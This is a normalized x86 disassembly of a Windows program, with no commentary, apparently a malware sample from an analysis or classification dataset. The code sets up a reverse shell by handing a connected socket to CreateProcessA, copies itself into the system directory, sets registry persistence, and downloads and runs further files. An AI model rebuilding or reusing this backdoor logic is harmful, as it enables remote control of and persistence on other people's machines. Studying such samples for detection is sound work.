sub_401000
mov ecx [ esp + 0x4 ]
sub esp 0x4ec
lea eax [ esp + 0x294 ]
push 0x258
push eax
push 0x1
push ecx
call [ LoadStringA@IAT ]
lea edx [ esp + 0x104 ]
lea eax [ esp + 0x294 ]
push edx
push eax
call sub_4018f0
lea ecx [ esp + 0x10c ]
push rw-data
push ecx
call sub_401540
add esp 0x10
lea edx [ esp ]
push 0x104
push edx
push 0x0
call [ GetModuleFileNameA@IAT ]
push 0x0
lea eax [ esp + 0x4 ]
push rw-data
push eax
call sub_401c30
lea ecx [ esp + 0xc ]
push ecx
call sub_401db0
push rw-data
call sub_401090
xor eax eax
add esp 0x500
retn 0x10
sub_401090
sub esp 0x384
push ebx
push ebp
push esi
push edi
xor ebx ebx
push ebx
push ebx
push ebx
push ebx
push 0x1
push 0x2
call [ WSASocketA@IAT ]
mov ebp eax
cmp ebp 0xffffffff
je r-xdata
jmp [ eax * 4 + jump_table_401528 ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x384
retn
lea edx [ esp + 0x14 ]
push 0x4
push edx
push 0x1005
push 0xffff
push ebp
mov [ esp + 0x28 ] 0x1770
call [ setsockopt@IAT ]
mov eax [ esp + 0x10 ]
push eax
call [ atol@IAT ]
add esp 0x4
push eax
call [ htons@IAT ]
mov ecx [ esp + 0x18 ]
mov [ esp + 0x1e ] ax
push ecx
mov [ esp + 0x20 ] 0x2
call [ inet_addr@IAT ]
mov [ esp + 0x20 ] eax
xor esi esi
mov [ esp + 0x18 ] rw-data
mov [ esp + 0x10 ] rw-data
push rw-data
call [ atoi@IAT ]
lea eax [ eax + eax * 4 ]
add esp 0x4
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
lea ecx [ eax + eax * 8 ]
shl ecx 0x7
push ecx
call [ Sleep@IAT ]
jmp r-xdata
lea edx [ esp + 0x290 ]
push edx
push 0x104
call [ GetTempPathA@IAT ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
mov esi ecx
js r-xdata
push 0x927c0
call [ Sleep@IAT ]
jmp r-xdata
push ebp
call [ closesocket@IAT ]
cmp edi ebx
je r-xdata
mov eax [ esp + 0x398 ]
push eax
call sub_401580
add esp 0x4
cmp eax 0x3
ja r-xdata
cmp esi ebx
je r-xdata
cmp [ esi + rw-data ] 0x2f
je r-xdata
mov ecx 0x5
mov edi rw-data
lea esi [ esp + 0x90 ]
xor eax eax
mov [ esp + 0x90 ] bl
[ esi ] [ edi ]
je r-xdata
push 0xbb8
call [ Sleep@IAT ]
cmp edi ebx
je r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
xor edx edx
[ edi ]
not ecx
dec ecx
sub ecx esi
dec ecx
test ecx ecx
jle r-xdata
dec esi
jns r-xdata
push rw-data
call [ GetStartupInfoA@IAT ]
push 0x104
push rw-data
mov [ rw-data ] 0x44
mov [ rw-data ] 0x101
mov [ rw-data ] ebp
mov [ rw-data ] ebp
mov [ rw-data ] ebp
mov [ rw-data ] bx
call [ GetSystemDirectoryA@IAT ]
or ecx 0xffffffff
mov edi rw-data
xor eax eax
push ebx
[ edi ]
not ecx
sub edi ecx
push rw-data
mov edx ecx
mov esi edi
shr ecx 0x2
mov edi rw-data
push rw-data
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
or ecx 0xffffffff
mov edi rw-data
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
or ecx 0xffffffff
mov edi rw-data
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi rw-data
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
call [ CopyFileA@IAT ]
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
push rw-data
push rw-data
push ebx
push ebx
push ebx
push 0x1
push ebx
push ebx
push rw-data
push rw-data
mov [ rw-data ] eax
call [ CreateProcessA@IAT ]
test eax eax
je r-xdata
push ebx
push 0x1
push rw-data
push ebp
call [ send@IAT ]
push ebx
lea ecx [ esp + 0x94 ]
push 0x200
push ecx
push ebp
call [ recv@IAT ]
mov ecx 0x5
mov edi rw-data
lea esi [ esp + 0x90 ]
xor edx edx
mov [ esp + eax + 0x8f ] bl
[ esi ] [ edi ]
je r-xdata
jmp r-xdata
lea edi [ esp + 0x2c ]
or ecx 0xffffffff
xor eax eax
mov [ esp + edx + 0x2c ] bl
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x290 ]
mov esi edi
mov ebp ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
lea eax [ esp + 0x290 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
push rw-data
call sub_401d20
add esp 0x8
test eax eax
je r-xdata
lea ebp [ esi + rw-data ]
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
add esp 0x384
retn
mov ecx [ rw-data ]
push 0xffffffff
push ecx
call [ WaitForSingleObject@IAT ]
push rw-data
call [ DeleteFileA@IAT ]
push ebp
call [ closesocket@IAT ]
push 0x1388
call [ Sleep@IAT ]
jmp r-xdata
push ebx
push 0xb
push rw-data
push ebp
mov [ esp + 0xa0 ] bl
call [ send@IAT ]
push ebx
lea ecx [ esp + 0x94 ]
push 0x200
push ecx
push ebp
call [ recv@IAT ]
lea edx [ esp + 0x90 ]
mov [ esp + eax + 0x8f ] bl
push edx
call [ atoi@IAT ]
add esp 0x4
mov esi eax
push ebp
call [ closesocket@IAT ]
push 0x14
call ??2@YAPAXI@Z
mov edi eax
push esi
push rw-data
push edi
call [ sprintf@IAT ]
push edi
call ??3@YAXPAX@Z
lea eax [ esi + esi * 4 ]
add esp 0x14
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 8 ]
shl eax 0x7
push eax
call [ Sleep@IAT ]
jmp r-xdata
mov ecx 0x5
mov edi rw-data
lea esi [ esp + 0x90 ]
xor eax eax
[ esi ] [ edi ]
jne r-xdata
lea edx [ esp + 0x1c ]
push 0x10
push edx
push ebp
call [ connect@IAT ]
inc esi
mov edi eax
cmp esi 0x4
jge r-xdata
push 0x493e0
call [ Sleep@IAT ]
jmp r-xdata
cmp [ rw-data ] ebx
je r-xdata
mov al [ ebp ]
mov edi rw-data
mov [ esp + edx + 0x2c ] al
inc edx
or ecx 0xffffffff
xor eax eax
inc ebp
[ edi ]
not ecx
dec ecx
sub ecx esi
dec ecx
cmp edx ecx
jl r-xdata
lea ecx [ esp + 0x290 ]
push ebx
push ecx
call [ WinExec@IAT ]
sub_401540
mov edx [ esp + 0x4 ]
push ebx
push edi
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
mov al [ edx ]
not ecx
dec ecx
mov bl [ ecx + edx - 0x1 ]
mov [ edx ] bl
mov [ ecx + edx - 0x1 ] al
mov eax [ esp + 0x10 ]
push eax
push edx
call sub_4018f0
add esp 0x8
mov eax 0x1
pop edi
pop ebx
retn
sub_401580
sub esp 0x280
mov eax [ esp + 0x284 ]
push ebx
push ebp
push esi
push edi
push eax
call sub_401a50
mov ecx 0x31
mov esi eax
lea edi [ esp + 0x3c ]
push eax
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov [ esp + 0x107 ] 0x0
call ??3@YAXPAX@Z
mov esi [ strstr@IAT ]
lea ecx [ esp + 0x40 ]
push rw-data
push ecx
call esi
mov edi eax
add esp 0x10
test edi edi
jbe r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x280
retn
lea edx [ esp + 0x38 ]
push rw-data
push edx
call esi
mov esi eax
add esp 0x8
test esi esi
jbe r-xdata
push 0xc8
call ??2@YAPAXI@Z
sub esi edi
mov ebp eax
add esi 0xfffffffa
add esp 0x4
xor eax eax
test esi esi
jle r-xdata
mov [ esp + eax + 0x100 ] 0x0
lea edx [ esp + 0x1c8 ]
lea eax [ esp + 0x100 ]
push edx
push eax
call sub_4018f0
add esp 0x8
test eax eax
je r-xdata
mov cl [ edi + eax + 0x5 ]
mov [ esp + eax + 0x100 ] cl
inc eax
cmp eax esi
jl r-xdata
push rw-data
push ebp
call [ sprintf@IAT ]
push ebp
call ??3@YAXPAX@Z
add esp 0xc
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x280
retn
lea ecx [ esp + 0x1c8 ]
push ebp
push ecx
call sub_401540
add esp 0x8
test eax eax
jne r-xdata
mov al [ ebp ]
cmp al 0x20
jl r-xdata
push ebp
call ??3@YAXPAX@Z
add esp 0x4
cmp al 0x7e
jg r-xdata
push 0x3a
push ebp
call [ strchr@IAT ]
mov ebx eax
add esp 0x8
sub ebx ebp
test ebx ebx
jle r-xdata
xor eax eax
test ebx ebx
jle r-xdata
mov [ esp + eax + 0x10 ] 0x0
mov edi ebp
or ecx 0xffffffff
xor eax eax
xor edx edx
[ edi ]
not ecx
dec ecx
sub ecx ebx
test ecx ecx
jle r-xdata
mov ecx ebx
mov esi ebp
mov edx ecx
lea edi [ esp + 0x10 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
mov eax ebx
and ecx 0x3
[ edi ] [ esi ]
mov al [ ebp ]
cmp al 0x30
jl r-xdata
lea esi [ ebx + ebp + 0x1 ]
mov ecx 0x5
mov edi rw-data
mov esi ebp
xor edx edx
[ esi ] [ edi ]
jne r-xdata
cmp al 0x39
jg r-xdata
mov al [ esi + edx ]
mov edi ebp
mov [ esp + edx + 0x24 ] al
or ecx 0xffffffff
xor eax eax
inc edx
[ edi ]
not ecx
dec ecx
sub ecx ebx
cmp edx ecx
jl r-xdata
mov ecx [ ebp ]
mov eax rw-data
cmp ecx [ eax ]
jne r-xdata
lea edi [ esp + 0x10 ]
or ecx 0xffffffff
xor eax eax
push ebp
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x28 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov edx ecx
mov esi edi
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
call ??3@YAXPAX@Z
add esp 0x4
mov eax 0x2
pop edi
pop esi
pop ebp
pop ebx
add esp 0x280
retn
lea edi [ esp + 0x10 ]
or ecx 0xffffffff
xor eax eax
push ebp
[ edi ]
not ecx
sub edi ecx
mov edx ecx
mov esi edi
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x28 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
call ??3@YAXPAX@Z
add esp 0x4
mov eax 0x1
pop edi
pop esi
pop ebp
pop ebx
add esp 0x280
retn
mov ecx 0x3
mov edi rw-data
mov esi ebp
xor eax eax
[ esi ] [ edi ]
jne r-xdata
mov edi ebp
or ecx 0xffffffff
xor eax eax
mov edx 0x4
[ edi ]
not ecx
dec ecx
cmp ecx edx
jle r-xdata
mov edi ebp
or ecx 0xffffffff
[ edi ]
not ecx
mov edx 0x3
dec ecx
cmp ecx edx
jle r-xdata
lea edi [ edx + ebp ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov edx ecx
mov esi edi
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
mov [ rw-data ] eax
pop ebp
mov eax 0x3
pop ebx
add esp 0x280
retn
cmp [ edx + ebp ] 0x20
jne r-xdata
lea edi [ edx + ebp ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov eax 0x3
mov edx ecx
mov esi edi
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
pop ebp
mov [ rw-data ] 0x1
pop ebx
add esp 0x280
retn
cmp [ edx + ebp ] 0x20
jne r-xdata
mov edi ebp
or ecx 0xffffffff
xor eax eax
inc edx
[ edi ]
not ecx
dec ecx
cmp edx ecx
jl r-xdata
mov edi ebp
or ecx 0xffffffff
xor eax eax
inc edx
[ edi ]
not ecx
dec ecx
cmp edx ecx
jl r-xdata
sub_4018f0
sub esp 0x8
push esi
push edi
mov edi [ esp + 0x14 ]
test edi edi
je r-xdata
pop edi
xor eax eax
pop esi
add esp 0x8
retn
mov esi [ esp + 0x18 ]
test esi esi
je r-xdata
mov al [ edi ]
test al al
je r-xdata
mov [ esi ] 0x0
pop edi
mov eax 0x1
pop esi
add esp 0x8
retn
push ebx
mov al [ edi ]
mov cl [ edi + 0x1 ]
mov [ esp + 0xc ] al
mov al [ edi + 0x2 ]
mov [ esp + 0xd ] cl
mov cl [ edi + 0x3 ]
cmp al 0x3d
mov [ esp + 0xe ] al
mov [ esp + 0xf ] cl
je r-xdata
inc edi
cmp cl 0x3d
jne r-xdata
mov edx [ esp + 0xc ]
cmp cl 0x3d
push edx
je r-xdata
mov al [ edi ]
test al al
jne r-xdata
mov eax [ esp + 0xc ]
push eax
call sub_4018d0
mov ecx [ esp + 0x11 ]
mov bl al
push ecx
call sub_4018d0
shr al 0x4
and al 0x3
add esp 0x8
shl bl 0x2
or al bl
add edi 0x4
mov [ esi ] al
inc esi
jmp r-xdata
call sub_4018d0
mov [ esp + 0x10 ] al
mov eax [ esp + 0x11 ]
push eax
call sub_4018d0
mov ecx [ esp + 0x16 ]
mov bl al
push ecx
call sub_4018d0
mov dl [ esp + 0x18 ]
mov cl bl
shr cl 0x4
shr al 0x2
and cl 0x3
and al 0xf
shl dl 0x2
shl bl 0x4
or cl dl
or al bl
add esp 0xc
mov [ esi ] cl
mov [ esi + 0x1 ] al
add edi 0x4
add esi 0x2
call sub_4018d0
mov [ esp + 0x10 ] al
mov eax [ esp + 0x11 ]
push eax
call sub_4018d0
mov ecx [ esp + 0x16 ]
mov bl al
push ecx
call sub_4018d0
mov edx [ esp + 0x1b ]
mov [ esp + 0x1a ] al
push edx
call sub_4018d0
mov dl [ esp + 0x1c ]
mov cl bl
shr cl 0x4
and cl 0x3
and al 0x3f
shl dl 0x2
or cl dl
mov dl [ esp + 0x1e ]
shr dl 0x2
and dl 0xf
add esp 0x10
shl bl 0x4
or dl bl
mov bl [ esp + 0xe ]
shl bl 0x6
or al bl
mov [ esi ] cl
mov [ esi + 0x1 ] dl
mov [ esi + 0x2 ] al
add edi 0x4
add esi 0x3
jmp r-xdata
cmp al 0xa
jne r-xdata
pop ebx
sub_401a50
push ecx
push ebx
push ebp
push esi
push edi
push 0x0
push 0x0
push 0x0
push 0x0
push rw-data
call [ InternetOpenA@IAT ]
push 0x0
mov ebx eax
mov eax [ esp + 0x1c ]
push 0x80000000
push 0x0
push 0x0
push eax
push ebx
call [ InternetOpenUrlA@IAT ]
push 0x64
mov ebp eax
call ??2@YAPAXI@Z
mov esi eax
mov ecx 0x19
xor eax eax
mov edi esi
[ edi ]
add esp 0x4
lea ecx [ esp + 0x10 ]
mov [ esp + 0x10 ] eax
push ecx
push 0x64
push esi
push ebp
call [ InternetReadFile@IAT ]
mov edi [ InternetCloseHandle@IAT ]
push ebp
call edi
push ebx
call edi
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
sub_401ad0
mov eax 0x1001c
call sub_401e50
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov edx [ rw-data ]
push ebx
push ebp
push esi
push edi
mov [ esp + 0x20 ] ecx
mov [ esp + 0x1c ] eax
mov eax [ rw-data ]
push 0x0
lea ecx [ esp + 0x20 ]
push 0x84000100
push ecx
mov [ esp + 0x30 ] edx
mov [ esp + 0x34 ] eax
call [ lstrlenA@IAT ]
mov ecx [ esp + 0x10038 ]
push eax
mov eax [ esp + 0x10040 ]
lea edx [ esp + 0x28 ]
push edx
push eax
push ecx
call [ InternetOpenUrlA@IAT ]
mov esi eax
test esi esi
jne r-xdata
lea edx [ esp + 0x18 ]
push 0x0
lea eax [ esp + 0x18 ]
push edx
push eax
push 0x20000005
push esi
mov [ esp + 0x28 ] 0x0
mov [ esp + 0x2c ] 0x4
call [ HttpQueryInfoA@IAT ]
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1001c
retn
mov ecx [ esp + 0x10038 ]
push rw-data
push ecx
call [ fopen@IAT ]
mov edi eax
add esp 0x8
test edi edi
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1001c
retn
mov ebx [ InternetReadFile@IAT ]
lea edx [ esp + 0x10 ]
push edx
lea eax [ esp + 0x30 ]
push 0x4000
push eax
push esi
call ebx
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1001c
retn
push edi
call [ fclose@IAT ]
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1001c
retn
mov ebp [ fwrite@IAT ]
call [ fflush@IAT ]
push edi
call [ fclose@IAT ]
add esp 0x8
mov eax 0x1
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1001c
retn
push eax
lea ecx [ esp + 0x34 ]
push 0x1
push ecx
call ebp
add esp 0x10
lea edx [ esp + 0x10 ]
lea eax [ esp + 0x2c ]
push edx
push 0x4000
push eax
push esi
call ebx
test eax eax
jne r-xdata
mov eax [ esp + 0x10 ]
push edi
test eax eax
je r-xdata
sub_401c30
sub esp 0x204
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x104 ]
push esi
push edi
mov edi [ esp + 0x210 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0x10c ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
mov eax [ esp + 0x218 ]
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ esp + 0x214 ]
test eax eax
push ecx
push edx
jne r-xdata
push rw-data
push rw-data
jmp r-xdata
mov ecx [ esp + 0x8 ]
lea edx [ esp + 0xc ]
push esi
push edx
push 0x1
lea eax [ esp + 0x118 ]
push 0x0
push eax
push ecx
call [ RegSetValueExA@IAT ]
test eax eax
je r-xdata
pop edi
xor eax eax
pop esi
add esp 0x204
retn
lea eax [ esp + 0x18 ]
push eax
call [ sprintf@IAT ]
lea edi [ esp + 0x1c ]
or ecx 0xffffffff
xor eax eax
add esp 0x10
[ edi ]
not ecx
dec ecx
mov esi ecx
lea ecx [ esp + 0x8 ]
push ecx
push 0x20006
push eax
push rw-data
push 0x80000002
inc esi
call [ RegOpenKeyExA@IAT ]
test eax eax
je r-xdata
mov edx [ esp + 0x8 ]
push edx
call [ RegCloseKey@IAT ]
pop edi
mov eax 0x1
pop esi
add esp 0x204
retn
pop edi
xor eax eax
pop esi
add esp 0x204
retn
sub_401d20
sub esp 0x44
lea eax [ esp ]
push esi
push 0x0
push eax
call [ InternetGetConnectedState@IAT ]
call [ timeGetTime@IAT ]
push eax
lea ecx [ esp + 0xc ]
push rw-data
push ecx
call [ sprintf@IAT ]
mov al [ esp + 0x10 ]
add esp 0xc
test al 0x4
push 0x0
push 0x0
push 0x0
jne r-xdata
lea eax [ esp + 0x14 ]
push 0x0
push eax
lea edx [ esp + 0x14 ]
push 0x4
push edx
jmp r-xdata
xor eax eax
pop esi
add esp 0x44
retn
mov ecx [ esp + 0x50 ]
mov edx [ esp + 0x4c ]
push edi
push ecx
push edx
push esi
call sub_401ad0
add esp 0xc
mov edi eax
push esi
call [ InternetCloseHandle@IAT ]
mov eax edi
pop edi
pop esi
add esp 0x44
retn
call [ InternetOpenA@IAT ]
mov esi eax
test esi esi
je r-xdata
sub_401db0
sub esp 0x8
lea eax [ esp + 0x4 ]
push eax
push rw-data
push 0x80000001
call [ RegCreateKeyA@IAT ]
lea ecx [ esp ]
push ecx
push 0xf003f
push 0x0
push rw-data
push 0x80000001
call [ RegOpenKeyExA@IAT ]
test eax eax
je r-xdata
mov edx [ esp + 0xc ]
push edi
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
push ecx
push edx
mov edx [ esp + 0xc ]
push 0x1
push eax
push rw-data
push edx
call [ RegSetValueExA@IAT ]
test eax eax
pop edi
je r-xdata
xor eax eax
add esp 0x8
retn
mov eax [ esp ]
push eax
call [ RegCloseKey@IAT ]
mov eax 0x1
add esp 0x8
retn
xor eax eax
add esp 0x8
retn
sub_401e50
push ecx
cmp eax 0x1000
lea ecx [ esp + 0x8 ]
jb r-xdata
sub ecx eax
mov eax esp
test [ ecx ] eax
mov esp ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push eax
retn
sub ecx 0x1000
sub eax 0x1000
test [ ecx ] eax
cmp eax 0x1000
jae r-xdata
_start
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x68
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x4 ] ebx
push 0x2
call [ __set_app_type@IAT ]
pop ecx
or [ rw-data ] 0xffffffff
or [ rw-data ] 0xffffffff
call [ __p__fmode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
call [ __p__commode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
mov eax [ _adjust_fdiv@IAT ]
mov eax [ eax ]
mov [ rw-data ] eax
call sub_401fff
cmp [ rw-data ] ebx
jne r-xdata
call sub_401fea
push rw-data
push rw-data
call _initterm
mov eax [ rw-data ]
mov [ ebp - 0x6c ] eax
lea eax [ ebp - 0x6c ]
push eax
push [ rw-data ]
lea eax [ ebp - 0x64 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
lea eax [ ebp - 0x60 ]
push eax
call [ __getmainargs@IAT ]
push rw-data
push rw-data
call _initterm
add esp 0x24
mov eax [ _acmdln@IAT ]
mov esi [ eax ]
mov [ ebp - 0x74 ] esi
cmp [ esi ] 0x22
jne r-xdata
push sub_401ffc
call [ __setusermatherr@IAT ]
pop ecx
cmp [ esi ] 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
mov al [ esi ]
cmp al bl
je r-xdata
mov al [ esi ]
cmp al bl
je r-xdata
inc esi
mov [ ebp - 0x74 ] esi
jmp r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp al 0x22
jne r-xdata
mov [ ebp - 0x30 ] ebx
lea eax [ ebp - 0x5c ]
push eax
call [ GetStartupInfoA@IAT ]
test [ ebp - 0x30 ] 0x1
je r-xdata
cmp al 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
push 0xa
pop eax
movzx eax [ ebp - 0x2c ]
jmp r-xdata
push eax
push esi
push ebx
push ebx
call [ GetModuleHandleA@IAT ]
push eax
call sub_401000
mov [ ebp - 0x68 ] eax
push eax
call [ exit@IAT ]
??3@YAXPAX@Z
jmp [ operator delete@IAT ]
??2@YAPAXI@Z
jmp [ operator new@IAT ]
sub_401fd1
mov esp [ ebp - 0x18 ]
push [ ebp - 0x78 ]
call [ _exit@IAT ]
int3
_XcptFilter
jmp [ _XcptFilter@IAT ]
_initterm
jmp [ _initterm@IAT ]
sub_401fea
push 0x30000
push 0x10000
call _controlfp
pop ecx
pop ecx
retn
sub_401ffc
xor eax eax
retn
sub_401fff
retn
_except_handler3
jmp [ _except_handler3@IAT ]
_controlfp
jmp [ _controlfp@IAT ]
